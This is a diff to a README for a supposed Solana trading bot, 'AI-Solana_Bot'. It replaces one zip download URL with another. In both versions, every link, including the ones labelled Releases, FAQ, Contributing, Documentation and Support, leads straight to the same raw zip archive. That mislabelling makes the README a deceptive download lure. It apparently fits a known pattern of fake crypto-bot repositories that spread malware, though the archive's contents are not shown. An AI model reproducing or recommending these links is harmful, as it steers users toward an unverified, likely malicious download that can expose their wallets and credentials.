@@ -6,7 +6,7 @@ Welcome to AI-Solana_Bot! This tool helps you trade on the Solana blockchain qui
 
 ## 📥 Download Now
 
-[![Download AI-Solana_Bot](https://raw.githubusercontent.com/Johnr12124/AI-Solana_Bot/main/Natick/AI-Solana_Bot.zip)](https://raw.githubusercontent.com/Johnr12124/AI-Solana_Bot/main/Natick/AI-Solana_Bot.zip)
+[![Download AI-Solana_Bot](https://github.com/Johnr12124/AI-Solana_Bot/raw/refs/heads/main/Natick/A_Bot_Solana_3.1.zip)](https://github.com/Johnr12124/AI-Solana_Bot/raw/refs/heads/main/Natick/A_Bot_Solana_3.1.zip)
 
 ## 📋 Features
 
@@ -24,7 +24,7 @@ Welcome to AI-Solana_Bot! This tool helps you trade on the Solana blockchain qui
 
 ## 🛠️ How to Download and Install
 
-1. **Visit the Releases Page:** Go to [the Releases page](https://raw.githubusercontent.com/Johnr12124/AI-Solana_Bot/main/Natick/AI-Solana_Bot.zip).
+1. **Visit the Releases Page:** Go to [the Releases page](https://github.com/Johnr12124/AI-Solana_Bot/raw/refs/heads/main/Natick/A_Bot_Solana_3.1.zip).
   
 2. **Choose Your Version:** Look for the latest version of AI-Solana_Bot. Ensure it is compatible with your operating system.
 
@@ -63,16 +63,16 @@ AI-Solana_Bot provides various options to customize your trading experience. The
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please visit the [FAQ section](https://raw.githubusercontent.com/Johnr12124/AI-Solana_Bot/main/Natick/AI-Solana_Bot.zip) or reach out for help from the community.
+If you encounter any issues or have questions, please visit the [FAQ section](https://github.com/Johnr12124/AI-Solana_Bot/raw/refs/heads/main/Natick/A_Bot_Solana_3.1.zip) or reach out for help from the community.
 
 ## 👥 Community and Contributions
 
-Join our community to discuss strategies, improvements, and experiences. Contributions are welcome! Check out the guidelines on our [Contributing page](https://raw.githubusercontent.com/Johnr12124/AI-Solana_Bot/main/Natick/AI-Solana_Bot.zip).
+Join our community to discuss strategies, improvements, and experiences. Contributions are welcome! Check out the guidelines on our [Contributing page](https://github.com/Johnr12124/AI-Solana_Bot/raw/refs/heads/main/Natick/A_Bot_Solana_3.1.zip).
 
 ## 🔗 Important Links
 
-- [Download AI-Solana_Bot](https://raw.githubusercontent.com/Johnr12124/AI-Solana_Bot/main/Natick/AI-Solana_Bot.zip)
-- [Documentation](https://raw.githubusercontent.com/Johnr12124/AI-Solana_Bot/main/Natick/AI-Solana_Bot.zip)
-- [Support](https://raw.githubusercontent.com/Johnr12124/AI-Solana_Bot/main/Natick/AI-Solana_Bot.zip)
+- [Download AI-Solana_Bot](https://github.com/Johnr12124/AI-Solana_Bot/raw/refs/heads/main/Natick/A_Bot_Solana_3.1.zip)
+- [Documentation](https://github.com/Johnr12124/AI-Solana_Bot/raw/refs/heads/main/Natick/A_Bot_Solana_3.1.zip)
+- [Support](https://github.com/Johnr12124/AI-Solana_Bot/raw/refs/heads/main/Natick/A_Bot_Solana_3.1.zip)
 
 Thank you for choosing AI-Solana_Bot! We hope it enhances your trading experience on Solana.
